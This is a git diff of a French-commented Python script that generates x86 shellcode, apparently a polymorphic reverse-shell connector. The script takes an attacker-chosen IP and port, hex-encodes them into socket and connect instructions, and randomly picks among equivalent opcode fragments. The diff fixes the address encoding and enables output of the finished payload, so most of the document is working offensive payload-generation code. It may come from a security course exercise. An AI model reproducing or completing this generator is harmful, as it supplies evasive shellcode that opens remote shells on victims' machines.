@@ -14,34 +14,27 @@ port = sys.argv[2]
 #Transformation de l'ip en hexa puis inversement de l'ip pour être utilisé dans le shellcode.
 
 def ip_to_hex(ip):
-    if len(ip.split('.')) != 4:
-        print("IP incorrecte.")
-    else:
-        byte4, byte3, byte2, byte1 = ip.split('.')
-        byte4 = int(byte4)
-        byte3 = int(byte3)
-        byte2 = int(byte2)
-        byte1 = int(byte1)
-        my_hex_ip = (byte4 * (256**3))  + (byte3 * (256**2)) + (byte2 * 256) + (byte1)
-        my_hex_ip = hex(my_hex_ip)
-        print(my_hex_ip)
-        
-        
-        my_hex_ip = my_hex_ip.strip("0x")
-        if len(my_hex_ip) % 2 != 0:
-            raise ValueError("La chaîne hexadécimale doit avoir une longueur paire")
-        
-        bytes_list = [my_hex_ip[i:i + 2] for i in range(0, len(my_hex_ip), 2)]
-        my_hex_ip = ''.join(bytes_list[::-1])
-        print('---')
-        print(my_hex_ip)
+    # Vérifier si l'adresse IP est valide en vérifiant que chaque partie est un entier entre 0 et 255
+    if not all(0 <= int(byte) <= 255 for byte in ip.split('.')):
+        raise ValueError("IP incorrecte. Assurez-vous d'utiliser des valeurs valides pour les octets (0-255).")
 
+    # Convertir chaque partie de l'adresse IP en une chaîne hexadécimale
+    hex_parts = (format(int(byte), 'X').zfill(2) for byte in ip.split('.'))
+
+    # Joindre les parties hexadécimales pour former la représentation hexadécimale complète
+    return ''.join(hex_parts)
 
 #Transformation du port en hexa puis inversement de l'ip pour être utilisé dans le shellcode.
 
+def port_to_hex(port):
+    port_hex = hex(int(port))[2:]  # Convertir le port en hexadécimal et enlever le préfixe "0x"
+    if len(port_hex) % 2 != 0:
+        port_hex = '0' + port_hex  # Ajouter un zéro au début si la longueur est impaire
 
+    return(port_hex)
 
 #Fonction qui ajoute les "\x" au shellcode.
+
 def shellcodize(s):
     shellcode = 'X'
     shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
@@ -50,12 +43,8 @@ def shellcodize(s):
     print(shellcode)
 
 
-
-
-
-
-
 ipv4 = ip_to_hex(ipv4)
+port = port_to_hex(port)
 
 ###### CREATION SOCKET ######
 
@@ -122,12 +111,17 @@ connexion_socket_4 = ["5252"]
 
 #push 0x0101017f -> 687F010101
 
-connexion_socket_5 = ["68"] + [ipv4]
+connexion_socket_5 = ["68"]
+connexion_socket_5.append(ipv4)
+connexion_socket_5 = ''.join(connexion_socket_5)
+print(connexion_socket_5)
 
 #push word 0x5c11 -> D05C11
 
-connexion_socket_6 = ["6668115C"]
-
+connexion_socket_6 = ["6668"]
+connexion_socket_6.append(port)
+connexion_socket_6 = ''.join(connexion_socket_6)
+print(connexion_socket_6)
 
 #push word 0x02 -> D002
 
@@ -267,8 +261,8 @@ shellcode += random.choice(connexion_socket_1)
 shellcode += random.choice(connexion_socket_2)
 shellcode += random.choice(connexion_socket_3)
 shellcode += random.choice(connexion_socket_4)
-shellcode += random.choice(connexion_socket_5)
-shellcode += random.choice(connexion_socket_6)
+shellcode += (connexion_socket_5)
+shellcode += (connexion_socket_6)
 shellcode += random.choice(connexion_socket_7)
 shellcode += random.choice(connexion_socket_8)
 shellcode += random.choice(connexion_socket_9)
@@ -300,5 +294,5 @@ shellcode += random.choice(list_lastcallsys)
 
 
 
-#shellcodize(shellcode)
-#print(len(shellcode))
+shellcodize(shellcode)
+print("Taille shellcode : ", len(shellcode))
